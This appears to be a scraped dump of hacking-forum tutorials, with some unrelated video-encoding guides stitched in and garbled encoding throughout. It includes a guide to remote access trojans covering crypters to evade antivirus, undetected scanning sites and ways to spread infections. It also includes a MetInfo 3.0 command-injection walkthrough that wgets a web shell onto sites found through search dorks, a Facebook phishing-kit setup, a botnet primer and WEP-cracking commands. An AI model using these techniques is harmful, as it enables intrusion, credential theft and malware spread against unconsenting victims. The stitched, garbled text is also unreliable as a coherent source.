[Class-1]	"""   Starter Hacking Thread For beginnners [Class-1]  Usually a beginner have two questions when they going to learn hacking Q 1.I want to be a hacker, but I dont know where to start Sad ? Ans.Well, youre in luck, because the best place to start off is right here! What is Hacking? Hacking is a process to bypass the security mechanisms of an information system or network. Or In common usage, hacker is a generic term for a computer criminal, often with a specific specialty in computer intrusion. While other definitions peculiar to the computer enthusiast community exist, they are rarely used in mainstream context. .. Or Hacking is an unauthorized use of computer and network resources. (The term \""hacker\"" originally meant a very gifted programmer. In recent years though, with easier access to multiple systems,it now has negative implications.) Hacking started way too far when the microsoft DOS was designed. Hacking is basically finding out the loop holes and trying leak some information out of it, which may lead you to get some critical information like passwords, credit card details. Sometimes hacking is done just because of the personal offesnses. Defining Hacker.. Hacker is a word that has two meanings: Traditionally, a hacker is someone who likes to tinker with software or electronic systems. Hackers enjoy exploring and learning how computer systems operate The good-guy (white-hat)  hackers donÃ¢â¬â¢t like being in the same category as  the bad-guy (blackhat) hackers . (These terms come from Western movies where the good guys wore white cowboy hats and the bad guys wore black cowboy hats.) Whatever the case, most people give hacker a negative connotation. Many malicious hackers claim that they donÃ¢â¬â¢t cause damage but instead are altruistically helping others. Yeah, right. Many malicious hackers are electronic thieves. Top 5 Most Famous Hackers of All Time 1. Jonathan James : James gained notoriety when he became the first juvenile to be sent to prison for hacking. He was sentenced at the age of 16 . In an anonymous PBS interview, he professes, \""I was just looking around, playing around. What was fun for me was a challenge to see what I could pull off.\"" James also cracked into NASA computers, stealing software worth approximately $1.7 million. 2. Adrian Lamo : Lamos claim to fame is his break-ins at major organizations like The New York Times and Microsoft. Dubbed the \""homeless hacker,\"" he used Internet connections at Kinkos, coffee shops and libraries to make his intrusions. In a profile article, \""He Hacks by Day, Squats by Night,\"" Lamo reflects, \""I have a laptop in Pittsburgh, a change of clothes in D.C. It kind of redefines the term multi-jurisdictional.\"" 3. Kevin Mitnick : A self-proclaimed \""hacker poster boy,\"" Mitnick went through a highly publicized pursuit by authorities. His mischief was hyped by the media but his actual offenses may be less notable than his notoriety suggests. The Department of Justice describes him as \""the most wanted computer criminal in United States history.\"" His exploits were detailed in two movies: Freedom Downtime and Takedown. 4. Kevin Poulsen: Also known as Dark Dante, he gained recognition for his hack of LA radios KIIS-FM phone lines, which earned him a brand new Porsche, among other items. His hacking specialty, however, revolved around telephones. 5. Robert Tappan Morris : Morris, son of former National Security Agency scientist Robert Morris, is known as the creator of the Morris Worm, the first computer worm to be unleashed on the Internet. As a result of this crime, he was the first person prosecuted under the 1986 Computer Fraud and Abuse Act.. The decision --> Firstly, you are going to need to know the difference between blackhats and whitehats. White-hat (ethical): Someone who uses his/her knowledge for good/to help others. Black-hat (un-ethical): Someone who uses his/her knowledge for personal gain/malicious reasons. Blackhat hacking examples:  Keylogging - Keystroke logging, basically logs what the person that you have infected is doing. As to what they are typing and basically what they do on their computer. DoS (short for Denial of Service attack) - a type of attack designed to disable networked systems usually by sending a huge amount of external requests thus flooding the system or making it work slowly. DDoS (short for Distributed Denial of Service attack) - Similar to DOS in almost every way except with DOS the attack comes from one source, but with DDOS the attack comes from multiple sources. To achieve this you will need a botnet/hostbooter(or other methods) which I will not go into deep discussion about in this tutorial. RAT - (Short for Remote Administrative Tool) or sometimes referred to as (Remote Administration Trojans) - These are somewhat similar to keyloggers, but they are also a lot different. RATS basically will give you control over the other persons computer (the person you have infected). Social Engineering - Basically a way to get someone to give you the information you want. You could attain this by posing to be someone you are not and using manipulative skills to get information from a person you know has the information. Whitehat hacking examples: penetration tester - Using your skills to do penetration tests. (usually paid work) Helping others - Community/forum based usually. CEH - Certified ethical hacker. And more! SO choose your self who you want to be an helper or a criminal behind the bars... Hackers Three Stages Script kiddies- these are beginners for hacking,these are the people who makes people looks bad.script kiddies have doesnt have any hacking skill.they use hacking tools developed by others without any knowledge what the going behind the scence. Intermediate hackers - these people have good knowledge about computer hardware,networks and programming knowledge to understand what can a script do.?,but like script kiddies they also use pre-developed hacking tools Elite hackers - These are the skilled hackers.they are the one who develop hacking toos and exploits they can break into system and hide there tracks. You should eventually got to this level .. ;) Q 2. Did i really want to learn Programming language for this ..? Ans. yup you should want to go through this because you cant what going behind the scripts and hacking tools so you should want to learn programming language.. I recommend to you first start with HTML because its a basic language if you masters in HTML then you can understand how webpages works After that you can go for C language because its most popular language in world also there are many powerful hacking tools or exploits you can make from C.. Resources For learning HTML urself - 1.HTMLDOG 2.W3SCHOOLS 3.Google Code 4.Mozilla developer network Resources For learning C language urself - 1.Learn code the hard way 2.Notes on programming in C also use the book -  The C programmming Language This is Class-1 for Hacking introdustion im going to keep updating this so be sticky with this thread and  [COLOR=\""#00FF00\""]IHF  forum :o I have various resources for programming languges and other stuff if you want reply below or PM me..[/COLOR]   """
0	Neos Guide to RAT [Updated 7.1.12]	"""   Neos Guide to RAT [Updated 7.1.12]  Remote Administration Tools RATs stand for Remote Administration Tools. It is a program used to control an Remote PC. Hence, the name Ã¢â¬ÅRemote Administration ToolÃ¢â¬Â. They can be used both for White Hat or Fun or personal purposes and also Black Hat or Malicious purposes. The user may take complete or partial control of a Remote Computer with or without his acknowledgement. Functioning of a RAT The RAT program is referred to as Client. The RAT client builds an program called server/virus. The server is often referred to as Trojan Horses. The RAT Client needs to use a specific port for the program to communicate with the host. For more about it just scroll down. So, when the server is ran on a remote PC, the infected PC starts communicating with the client. Many RAT used for Black Hat purposes make their functioning hidden from the Host. Thus, when a connection is established the Client can take full or partial control of his computer. When a RAT server is installed without the acknowledgement of the Host then the Host is often referred to as Bot, slave, slave, install, etc.  Types of RATs and its features Non-Malicious RATs Team viewer Log me in Ammy Join.me Theyre mostly used for Personal or White Hat purposes. These require the HostÃ¢â¬â¢s permission and the host can cut off the connection any time if wanted. So itÃ¢â¬â¢s useful to fix a Remote Computer just sitting at your PC. Malicious RATs The name suggests it. It is used for blackhat purposes. Like stealing their information, spying on them,etc. Especially without their knowledge. TCP RATs They communicate directly from the host to the client. They require portforwarding. They have many feature than Php/Http bots. So more features = More fun. They are always the first priority. Get to the Php/Http RAT if you have serious problems in portforwarding.  Free RATs Dark-comet Cyber Gate Poison Ivy Bi-frost Spy-Net Xtreme RAT Paid RATs Blackshades NET Paradox RAT Client mesh Anguish RAT PHP/HTTP RATs They work without the need to port forward. Its more stable than TCP RATs but will have relatively less features though. List of common Php/Http RATs Vertex NET Loki RAT BlackShades Fusion Lynx RAT Some general features of a RAT Block mouse and keyboard Change your desktop wallpaper Download, upload, delete, and rename files Drop viruses and worms Edit Registry Format drives Grab passwords, credit card numbers Hijack homepage Hide desktop icons, taskbar and files Log keystrokes, keystroke capture software Open CD-ROM tray Overload the RAM/ROM drive Print text Play sounds Randomly move and click mouse Record sound with a connected microphone Record video with a connected webcam Shutdown, restart, log-off, shutdown monitor Steal passwords View screen View, kill, and start tasks in task manager Ports A port is needed for any Remote Connection to communicate with your Computer. For Example, Port 80 used for Web services , Port 25 is used for SMTP. So, a port is needed for every specific program to communicate with a Remote device. Obviously, a RAT too needs a port to communicate with the Remote PC(Host). Port Forwarding Port forwarding is the method of opening a specific port on the router to allow out bounding connections. For forwarding a port you must need access to your router. Sometimes UPnP is used in case you donÃ¢â¬â¢t have access to your router and your router supports UPnP. UPnP means Universal Plug and Play. If your router supports UPnP then the port may be opened using a third party software such as Utorrent. VPN VPN or Virtual Private Network. I need not explain it much here. Its used to hide your IP and stay anonymous. Its like if your under a VPN when you request a web resource it first goes into the VPN server and gets the web resource. Some VPNs may allow you to open some certain ports. So, it can solve your port-forwarding issues. DNS DNS known as Domain Name System. If you have an dynamic IP your IP changes often. So, its practically not possible for the bots to stay connected to you. So, a DNS provides you an domain which will redirect to whatever IP you have. There many DNS providers the most widely used are: NO-IP dyndns Cryptography ItÃ¢â¬â¢s the method of hiding your server from Anti-Viruses. ItÃ¢â¬â¢s because most of the RAT server are detected by many Anti-Viruses. So when your Victims open your server their Anti-Virus may block it. So in this case a crypter is used. ItÃ¢â¬â¢s the software that protects your server from Anti-Viruses. So, every crypter has a stub either inbuilt or separate from the crypter. A stub is a code when added to your server makes it FUD or UD. FUD : Fully Un-Detected It means that the stub is un-detectable by all Anti viruses. UD : Un-detected It means that the stub is un-detected by few anti-viruses and few detect it. Virus scanning sites They are often used to check a binary for threats/viruses. These sites use multiple Antivirus engines to test the binary uploaded. Most of them are co-operated by Antivirus companies and they send the binary samples to the Antivirus companies for analyzing them. So if your FUD server is uploaded to sites like this your server will get detected by Antivirus companies. So, obviously your FUD server will become UD. But, some sites do not give out the binary samples to Antivirus companies. They are often used to check the FUD or UD status of the server/stub. Some sites that give out samples Virus total Virus jotti Some sites that dont give out samples: http://elementscanner.net/ http://my-avscan.net/ http://www.novirusthanks.org/  (make sure you check the do not distribute sample) Dependencies Some crypters coded in VB.NET or C# needs .NET framework for the stub to run. So, they are often described as Ã¢â¬Å.NET dependent crypterÃ¢â¬Â. .NET framework usually comes pre-installed on Windows Vista or above. Some crypters coded in C++, ASM, VB6 or any other language that does not involve .NET can be run on systems even without .NET framework. They are pretty much stable and have high execution rates. But, they are relatively costlier than the .NET dependent ones. Java Driveby ItÃ¢â¬â¢s a java applet its uploaded to an webhost. Its often covered by an legit looking site clone. So, when the slave opens up the website. An java message pops up. With two options Run or cancel. 90% of people will click Run. So, when Run is clicked your server is executed inside their computer without their knowledge. Botkilling Botkilling also known a Ruskilling. The name describes it killing your bot/server. So, it means killing other bots/servers inside the slaveÃ¢â¬â¢s computer. Some crypters and RATs have this function. Though it may be useful sometimes it will frustrating when you buy some bots and they botkill your server. """

In This tutorial I will explain all terms of making Dual or Multiple Audio files which will help you to make dual audio movie.  Download      AVI-Mux GUI      if you dont have it yet, and run it (it doesnt require any installation). Load your avi file (with or without any audio) in      AVI-Mux GUI     by simply dragndrop it there (#1) In my example file I loaded has only English original audio, and Im going to add English Commentary audio as a secondary audio. Someone else may want to use i.e. dubbed audio track in his localized language... or add both. Its your choice    2.    Once youve loaded the file, highlight it by clicking on it, then click on \""generate data source from files\"". It will show you what video and audio streams your file has, see #2   3.        Load the external audio track (and/or subtitles) what you wish to add to your movie (in my example it is MP3 rip of Commentary Track) see #3. Addendum: If youre adding multiple audio tracks with multiple subtitles - see picture #3B (in addendum, at the end of this guide - below). Picture #3c shows all the multiplexed subtitle options within finalized AVI file (on a computer, using plain     Windows Media Player 6.4        and       ffdshow        filter). Please note that not all dvd/divx standalone players are able to select and/or display subtitles that are multiplexed inside the AVI file. For adding only subtitles, or multiple audio and multiple subtitles, follow next steps the same way as I explained when adding just second audio track.       Make sure your original movie audio track is set as Default audio (#4), unless you want to change it. Default audio track It means this audio track will play on every software or hardware divx/dvd-player that is *not* capable of playing other audio tracks, and there are plenty of them out there. So if I would have set as a default the commentary track that Im adding in my example, then it wouldnt be right on such players, right?   You can also set Language properties/names for each of the audio tracks (#5) for all those players that are able to distinguish and select more than one audio track. Finally hit start (#6) and select where to save your newly created dual audio file and under what name. Thats all.          If you load your newly created multi-audio AVI file in a GSpot, it will show properties for all of your audio tracks selectable there:    PLAYBACK ISSUES     Standalone divx/dvd player should have no problem with such files, and you would select audio tracks the same way as you do with standard DVD-Video discs on your player (usually hit the button \""Audio\"" on your remote  ). But there is one tricky part of playing such files on a PC with software players. I do know many of them have problem with secondary audio tracks within AVI container (yet all of them will have no problem playing such AVI files at all, they will just play them with the default audio track only). Since it is not the scope of this guide how to make secondary audio playable on your PC and every software player out there (I dont watch movies on any computers, so please forgive me) I will just write how to make them playable with most popular player on PC -     Windows Media Player       which is built-in into every Windows since Windows 95: Simply install Morgan Media Switcher - available for free (link above).  It works on every       WMP        from version 6.4 and up, and I just have tested version 0.99 with WMP6.4 on my Windows 2000 machine.      In a red frame you can see the way names of your Audio Tracks normally will appear. However if you want their names to be more specific (like it is in my example - \""Audio Track 1\"" appear as \""English\"", and \""Audio Track 2\"" appear as \""Commentary Track\"") you need to open your Notepad, and create new text file (usually it is autonamed as \""New Text Document\""). Open it and type: [MSS] Audio_1=English Audio_2=Commentary Track (as in my example, you may need to type i.e. Francaise and Whatever instead of English and Commentary Track). Save the file, then rename it to exact same name as your movie file is, and change the files extension from .txt to .mss (so Morgan Stream Switcher could see it). As in my example, since previously I saved my dual audio movie as: Repulsion.Dual.Audio.DVDrip.DivX5.avi therefore I renamed this New Text Document.txt file to: Repulsion.Dual.Audio.DVDrip.DivX5.mss If you cant see the .txt extension of your file it means your Windows hide extensions by default, you need to enable it first, otherwise the .txt extension will still be there and you will be creating something like \""Repulsion.Dual.Audio.DVDrip.DivX5.mss.txt\"" without seeing the ending .txt part of filename (as it would have been in my example).     Enjoy !!!!    """
0	Video h264 Encoding Tutorial with meGUI	"""   This tutorial will show you how to encode your video to h264 with meGUI. Please note that MeGUI is frequently updated, so this tutorial might not be fully accurate. What youll need: Avisynth meGUI There are many versions of avisynth, I would suggest that you download the latest stable version, which right now is 2.5. Then install avisynth, just select the standard installation. Next install meGUI and then open it once youve installed it. When meGUI is launched it will ask you if you want to update it. Select \""yes\""  Then just click \""update\"", it should have checked all the boxes for you.  Windows with presets will pop-up, I would suggest that you tick them all, because many of them will be useful later on.  A quick way to select the presets is to right click with your mouse and select check all. meGUI will say that it needs to be restarted. The installation is finished after it has been restarted. Now we can select the movie you want to encode. Go to Tools > AVS Script Creator A window will pop-up. Just select the video input.  Then click save. Open up the meGUI window again. Next select an option from the encoder setting. I would suggest one of these 3: Ã¢â¬Â¢x264 Unrestricted: 2 Pass Fast - Decent quality, good for people with really slow processors. Ã¢â¬Â¢x264 Unrestricted: 2 Pass HQ - Good quality, probably the best solution for most people, you should at least have a dual core processor if you select this option. Ã¢â¬Â¢x264 Unrestricted: 2 Pass Insane - The best quality you can get. It will take a long time to encode, even with a good processor. With a bad processor youll be encoding a 10 minute movie for days. Then you need to import the presets, in MeGUI click file and select \""Import Presets\"". Then after a few seconds a new window should open, I suggest that you tick all the presets (a fast way to tick all the presets is to right click and select \""Check All\""). Select the file format as MP4. Next select the audio track for your movie by clicking the button on the Audio Input row. If you dont have a separate audio track then you can just put the video there that contains the audio track. Next you need to select the encoder setting for the audio. I highly recommend that you use FAAC. Many streaming sites like YouTube use AAC as their audio codec, so this reduces the chance of your video getting a screwed up audio on YouTube and other places. You can select the audio bitrate by clicking the config on the right side of the encoder setting.  Select ABR and choose the bitrate you want for your video. Anything between 320 and 128 is good. Select the extension for the audio to be M4A Now the meGUI page should look like this:  Youre almost ready to encode. Click the AutoEncode button in the bottom right corner.  Select Average Bitrate and put a vaule there. Anything around 5000-6000 is good. The bitrate affects the video quality the most. A 5000-6000 bitrate is pretty much perfect quality. The bitrate also affects the filesize of the video. No one wants to download a 213471313891231 GB file so I really suggest that you stay below 10000 bitrate. 5000-6000 bitrate gives the best quality/filesize ratio. Then click Queue Now select the Queue tab on meGUI  Then click Start. It should start to work on the different jobs...  On the meGUI window there should be listed 4 jobs. Once all the jobs are \""done\"". Then youre video is encoded and ready to be viewed. When youre done delete all the jobs. If you get an error, it is most likely because you used the video as the audio track. Select AAC/WMA/WAV as the output format. Once youve got the new audio track go back to meGUI and put it as the Audio Input. Then go to AutoEncode and select the bitrate and queue the jobs. Remember to delete any old jobs from the queue before you queue new jobs.   """

Code injection can be used by an attacker to introduce (or \""inject\"") code into a computer program to change the course of execution. The results of a code injection attack can be disastrous. For instance, code injection is used by some computer worms to propagate. In this tutorial, I will be showing you how to exploit a vulnerability in MetInfo 3.0 by injecting linux (sometimes windoz) commands. Here is the exploit listed on exploit-db, however it doesnt give much of an explanation, for the sole purpose of skid control. Fortunately, I will be explaining this step by step EXPLOIT ::  http://www.exploit-db.com/exploits/15361/ dork :: \""Powered by MetInfo 3.0 \"" [google it and pick up a site] When you have a site that has Powered by MetInfo 3.0 at the bottom, copy the website domain name, and take the perl script from the link and run it Ex. :: perl exploit.pl  http://www.site.com Perl Script ::  http://pastie.org/1378847 It will take a few seconds, then report back whether it is vulnerable or not. If it is, go to the link it gives you. If you see the userid info, then youre good to go. If not, the page may have already been hacked, patched, or deleted :/ but it doesnt matter much, there are around 400,000 sites provided by good ol google Devlish When you have a vulnerable site and are able to inject cmds, all you need to do is download your shell from another server with wget, and then rename it from .txt to .php with mv In case you dont know how to use wget and mv, use the following format: wget  http://site.com/shell.txt mv shell.txt shell.php [[Where it says \""cmd=\"" put wget --tries=2 directlinkhere. So it would look like Ex:  http://www.site.com/templates/test.php?cmd=wget  --tries=2  http://www.shellurlhere.com/bill/shell.txt Then after you have done that just put cmd=mv shell.txt shell.php to change it to php and then navigate to it.]] u have to go like this http://site.com/test.php?cmd=wget   http://site2.com/shell.txt http://site.com/test.php?cmd=mv  shell.txt shell.php http://site.com/shell.php Enjoy thnkzz fr reading this guyzz !!!

Phishing :- Phishing is a way of attempting to acquire sensitive information such as  user-names, passwords and credit card details by a fake page. I.e. By  Phishing we create the fake login page which is a clone of the original  page. Phishing is used for criminal activities for stealing Username,  Password, Credits Card information, Personal information, etc. How the Phish Page Works?   Whenever a user types his/her Username & Password in the text box  of phish page, the information is sent to Ã¢â¬Åwrite.phpÃ¢â¬Â which acts as a  password logger and redirects the page to the original address of  Facebook. So that the victim does not know that your site is a  fake/Phishing site and gets his/her Face book password hacked.    Steps to hack a Facebook password: Step 1:  First of all we need a phish page,  Hidden Content:  You must reply to see links Yahoo,Facebook,Gmail  Phishing pages.. Step 2:   After downloading extract your phishing package. In this package you will get the following 1. fb.htm (A Facebook phish page) 2. fbpost.php (This file will redirect your phish page and password) 3. fblog.txt (A text file that contains the password of your victim, which will be automatically created by the php script)   and same for yahoo nd gmail files... Step 3:   Now you have to create an account in a web-hosting site. You  can create one from any of the following free web-hosting sites.

0	tUt a beGGiners guId t0 b0Tnet....	"""   [COLOR=\""#FF0000\""]     The main drivers for botnets are for recognition and financial gain. The larger the botnet, the more Ã¢â¬ËkudosÃ¢â¬â¢ the herder can claim to have among the underground community. The bot herder will also Ã¢â¬ËrentÃ¢â¬â¢ the services of the botnet out to third parties, usually for sending out spam messages, or for performing a denial of service attack against a remote target. Due to the large numbers of compromised machines within the botnet huge volumes of traffic (either email or denial of service) can be generated. However, in recent times the volumes of spam originating from a single compromised host have dropped in order to thwart anti-spam detection algorithms Ã¢â¬â a larger number of compromised hosts send a smaller amount of messages in order to evade detection by anti-spam techniques.     Botnets have become a significant part of the Internet, albeit increasingly hidden. Due to most conventional IRC networks taking measures and blocking access to previously-hosted botnets, controllers must now find their own servers. Often, a botnet will include a variety of connections and network types. Sometimes a controller will hide an IRC server installation on an educational or corporate site where high-speed connections can support a large number of other bots. Exploitation of this method of using a bot to host other bots has proliferated only recently as most script kiddies do not have the knowledge to take advantage of it.     Several botnets have been found and removed from the Internet. The Dutch police found a 1.5 million node botnet and the Norwegian ISP Telenor disbanded a 10,000-node botnet. In July 2010, the FBI arrested a 23-year old Slovenian held responsible for the malicious software that integrated an estimated 12 million computers into a botnet. Large coordinated international efforts to shut down botnets have also been initiated.It has been estimated that up to one quarter of all personal computers connected to the internet may be part of a botnet.    [COLOR=\""#00FF00\""] Botnet lifecycle     * Bot-herder configures initial bot parameters such as infection vectors, payload, stealth, C&C details     * Register a DDNS     * Register a static IP     * Bot-herder launches or seeds new bot(s)     * Bots spread     * Causes an increase of DDoS being sent to the victim     * Losing bots to rival botnets[/COLOR]   Types of attacks   * Denial-of-service attacks  where multiple systems autonomously access a single Internet system or service in a way that appears legitimate, but much more frequently than normal use and cause the system to become busy.     *  Adware  exists to advertise some commercial entity actively and without the users permission or awareness, for example by replacing banner ads on web pages with those of another content provider.     *  Spyware  is software which sends information to its creators about a users activities Ã¢â¬â typically passwords, credit card numbers and other information that can be sold on the black market. Compromised machines that are located within a corporate network can be worth more to the bot herder, as they can often gain access to confidential information held within that company. There have been several targeted attacks on large corporations with the aim of stealing sensitive information, one such example is the Aurora botnet.[9]     *  E-mail spam  are e-mail messages disguised as messages from people, but are either advertising, annoying, or malicious in nature.     *  Click  fraud is the users computer visiting websites without the users awareness to create false web traffic for the purpose of personal or commercial gain.     *  Access number replacements  are where the botnet operator replaces the access numbers of a group of dial-up bots to that of a victims phone number. Given enough bots partake in this attack, the victim is consistently bombarded with phone calls attempting to connect to the internet. Having very little to defend against this attack, most are forced into changing their phone numbers (land line, cell phone, etc).     *  Fast flux  is a DNS technique used by botnets to hide phishing and malware delivery sites behind an ever-changing network of compromised hosts acting as proxies.   Preventive measures     If a machine receives a denial-of-service attack from a botnet, few choices exist. Given the general geographic dispersal of botnets, it becomes difficult to identify a pattern of offending machines, and the sheer volume of IP addresses does not lend itself to the filtering of individual cases. Passive OS fingerprinting can identify attacks originating from a botnet: network administrators can configure newer firewall equipment to take action on a botnet attack by using information obtained from passive OS fingerprinting. The most serious preventive measures utilize rate-based intrusion prevention systems implemented with specialized hardware.     Some botnets use free DNS hosting services such as DynDns.org, No-IP.com, and Afraid.org to point a subdomain towards an IRC server that will harbor the bots. While these free DNS services do not themselves host attacks, they provide reference points (often hard-coded into the botnet executable). Removing such services can cripple an entire botnet. Recently, these companies have undertaken efforts to purge their domains of these subdomains. The botnet community refers to such efforts as \""nullrouting\"", because the DNS hosting services usually re-direct the offending subdomains to an inaccessible IP address.     The botnet server structure mentioned above has inherent vulnerabilities and problems. For example, if one was to find one server with one botnet channel, often all other servers, as well as other bots themselves, will be revealed. If a botnet server structure lacks redundancy, the disconnection of one server will cause the entire botnet to collapse, at least until the controller(s) decides on a new hosting space. However, more recent IRC server software includes features to mask other connected servers and bots, so that a discovery of one channel will not lead to disruption of the botnet.     Several security companies such as Afferent Security Labs, Symantec, Trend Micro, FireEye, Simplicita and Damballa have announced offerings to stop botnets. While some, like Norton AntiBot (discontinued), are aimed at consumers, most are aimed to protect enterprises and/or ISPs. The host-based techniques use heuristics to try to identify bot behavior that has bypassed conventional anti-virus software. Network-based approaches tend to use the techniques described above; shutting down C&C servers, nullrouting DNS entries, or completely shutting down IRC servers.     Newer botnets are almost entirely P2P, with command-and-control embedded into the botnet itself. By being dynamically updateable and variable they can evade having any single point of failure. Commanders can be identified solely through secure keys and all data except the binary itself can be encrypted. For example a spyware program may encrypt all suspected passwords with a public key hard coded or distributed into the bot software. Only with the private key, which only the commander has, can the data that the bot has captured be read.     Newer botnets have even been capable of detecting and reacting to attempts to figure out how they work. A large botnet that can detect that it is being studied can even DDoS those studying it off the internet.     There is an effort by researchers at Sandia National Laboratories to analyze the behavior of these botnets by simultaneously running one million Linux kernels as virtual machines on a 4,480-node Dell high-performance computer cluster.

It is mostly used for malicious purposes, such as controlling PCÃ¢â¬â¢s, stealing victims data, deleting or editing some files. You can only infect someone by sending him file called Server and they need to click it.     Q Ã¢â¬â How they work?     A - Some RATs can spread over P2P file sharing programs(uTorrent, Pirate Bay etc.), Messangers spams(MSN, Skype, AIM etc.).     Q Ã¢â¬â Download?     A Ã¢â¬â Well you can find any type of RAT here, on beginnershacking.wordpress.com. To download. and you will find some links. Also, you can buy FUD private version of RAT: Albertino RAT, Medusa Rat, jRAT etc. Also you will need DNS host for your RAT.     Q Ã¢â¬â How do I control server?     A - Once installed, RAT server can be controlled via RAT client. From IP list box you choose PC and connect.     Q Ã¢â¬â What do I need to setup RAT?     A - Well, you will need Windows OS, open port & RAT. To forward your port scroll for tutorial link or click this URL.     Q Ã¢â¬â How do I port forward?     A Ã¢â¬â Port forwarding is easy and important for RAT. Well, you need open port because RAT connects through open port and bypass firewall. Open your web browser and write your IP and connect to your rooter(write Username: Admin & Password: Admin), open port forward page and write port you want and your IP. Well thatÃ¢â¬â¢s all you need to do and now you got open port     Q Ã¢â¬â How do I make my server FUD?     A - If you want to make your server FUD again, you will need crypter(you can find free FUD one here.). Also, you can hex edit your server, but be careful some servers can crash after hex editing, any way check out this cool tutorial How to make FUD with hex editing.     Q Ã¢â¬â How do I remove server if I infect myself?     A - When you infect yourself, first what you going to do is to connect to your PC. Some RATs have function to uninstall servers, well you click that and you uninstall it. Well there is another way, download MalwareBytesÃ¢â¬â¢ Anti-Malware and scan whole computer for Trojan.     Q Ã¢â¬â Legal or illegal?     A - Well some RATs are legal, and some are not. Legal are the one without backdoor left, and they have abillity to close connection anytime. Illegal are used for hacking and they can steal data(Credit Cards, Passwords, private data etc.).     Legal:     TeamViewer Ã¢â¬â Access any remote computer via Internet just like sitting in front of it Ã¢â¬â even through firewalls.

A Ã¢â¬â There are few different ways to spread your server. You can spread on warez websites, P2P file sharing websites(uTorrent, Pirate bay etc.), YouTube etc. Well some people use custom made Auto-Spreaders programs to spread their server. But best and most effective way to spread is when you FUD your server.     Q Ã¢â¬â Whats DNS host?     A - The Domain Name System (DNS) is a hierarchical naming system for computers, services, or any resource connected to the Internet or a private network. It associates various information with domain names assigned to each of the participants. Most importantly, it translates domain names meaningful to humans into the numerical (binary) identifiers associated with networking equipment for the purpose of locating and addressing these devices worldwide.     Q Ã¢â¬â What can RAT do?     A Ã¢â¬â Here is list of basic features:     Ã¢â¬Â¢ Manage files Ã¢â¬Â¢ Control web browser(Change homepage, open site etc.) Ã¢â¬Â¢ Get system informations(OS Version, AV name, Ram Memory, Computer name etc.) Ã¢â¬Â¢ Get passwords, credit card numbers or private data etc. Ã¢â¬Â¢ View and remote control desktop Ã¢â¬Â¢ Record camera & sound Ã¢â¬Â¢ Control mouse Ã¢â¬Â¢ Delete, rename, download, upload or move files     Q Ã¢â¬â WhatÃ¢â¬â¢s reverse Connection?     A - A reverse connection is usually used to bypass firewall restrictions on open ports. The most common way a reverse connection is used is to bypass firewall and Router security restrictions.     Q Ã¢â¬â Whats direct connection?     A - A direct-connect RAT is a simple setup where the client connects to a single or multiple servers directly. Stable servers are multi-threaded, allowing for multiple clients to be connected, along with increased reliability.     Q Ã¢â¬â Can I get traced when I rat somebody?     A Ã¢â¬â Yes and no. Depends on victim, it is really hard to remove infection or even trace a hacker. There are tools like WireShark, but itÃ¢â¬â¢s really hard to trace, because PC usually got over 300 connections. So donÃ¢â¬â¢t worry.     Direct connection:     Code:     [Client]     | [Client]     | /     | /     | /     | /     [Server]-----[Client]  hope this help n00bs!! by D3D0S3R!! """

But did you know how easy? Take a look. Note: This post demonstrates how to crack WEP passwords, an older and less often used network security protocol. If the network you want to crack is using the more popular WPA encryption, see our guide to cracking a Wi-Fi networks WPA password with Reaver instead. Today were going to run down, step-by-step, how to crack a Wi-Fi network with WEP security turned on. But first, a word: Knowledge is power, but power doesnt mean you should be a jerk, or do anything illegal. Knowing how to pick a lock doesnt make you a thief. Consider this post educational, or a proof-of-concept intellectual exercise. Dozens of tutorials on how to crack WEP are already all over the internet using this method. Seriously—Google it. This aint what youd call \""news.\"" But what is surprising is that someone like me, with minimal networking experience, can get this done with free software and a cheap Wi-Fi adapter. Heres how it goes. What Youll Need Unless youre a computer security and networking ninja, chances are you dont have all the tools on hand to get this job done. Heres what youll need: A compatible wireless adapter— This is the biggest requirement. Youll need a wireless adapter thats capable of packet injection, and chances are the one in your computer is not. After consulting with my friendly neighborhood security expert, I purchased an Alfa AWUS050NH USB adapter, pictured here, and it set me back about $50 on Amazon. Update: Dont do what I did. Get the Alfa AWUS036H, not the US050NH, instead. The guy in this video below is using a $12 model he bought on Ebay (and is even selling his router of choice). There are plenty of resources on getting aircrack-compatible adapters out there. A BackTrack Live CD. We already took you on a full screenshot tour of how to install and use BackTrack 3, the Linux Live CD that lets you do all sorts of security testing and tasks. Download yourself a copy of the CD and burn it, or load it up in VMware to get started. A nearby WEP-enabled Wi-Fi network. The signal should be strong and ideally people are using it, connecting and disconnecting their devices from it. The more use it gets while you collect the data you need to run your crack, the better your chances of success. Patience with the command line. This is an ten-step process that requires typing in long, arcane commands and waiting around for your Wi-Fi card to collect data in order to crack the password. Like the doctor said to the short person, be a little patient. Crack That WEP To crack WEP, youll need to launch Konsole, BackTracks built-in command line. Its right there on the taskbar in the lower left corner, second button to the right. Now, the commands. First run the following to get a list of your network interfaces: airmon-ng The only one Ive got there is labeled ra0. Yours may be different; take note of the label and write it down. From here on in, substitute it in everywhere a command includes (interface). Now, run the following four commands. See the output that I got for them in the screenshot below. [COLOR=\""#00FFFF\""]airmon-ng stop (interface) ifconfig (interface) down macchanger --mac 00:11:22:33:44:55 (interface) airmon-ng start (interface)[/COLOR] If you dont get the same results from these commands as pictured here, most likely your network adapter wont work with this particular crack. If you do, youve successfully \""faked\"" a new MAC address on your network interface, 00:11:22:33:44:55. Now its time to pick your network. Run: airodump-ng (interface) To see a list of wireless networks around you. When you see the one you want, hit Ctrl+C to stop the list. Highlight the row pertaining to the network of interest, and take note of two things: its BSSID and its channel (in the column labeled CH), as pictured below. Obviously the network you want to crack should have WEP encryption (in the ENC) column, not WPA or anything else. Like I said, hit Ctrl+C to stop this listing. (I had to do this once or twice to find the network I was looking for.) Once youve got it, highlight the BSSID and copy it to your clipboard for reuse in the upcoming commands. Now were going to watch whats going on with that network you chose and capture that information to a file. Run: airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface) Where (channel) is your networks channel, and (bssid) is the BSSID you just copied to clipboard. You can use the Shift+Insert key combination to paste it into the command. Enter anything descriptive for (file name). I chose \""yoyo,\"" which is the networks name Im cracking. Youll get output like whats in the window in the background pictured below. Leave that one be. Open a new Konsole window in the foreground, and enter this command: aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface) Here the ESSID is the access points SSID name, which in my case is yoyo. What you want to get after this command is the reassuring \""Association successful\"" message with that smiley face. Youre almost there. Now its time for: aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface) Here were creating router traffic to capture more throughput faster to speed up our crack. After a few minutes, that front window will start going crazy with read/write packets. (Also, I was unable to surf the web with the yoyo network on a separate computer while this was going on.) Heres the part where you might have to grab yourself a cup of coffee or take a walk. Basically you want to wait until enough data has 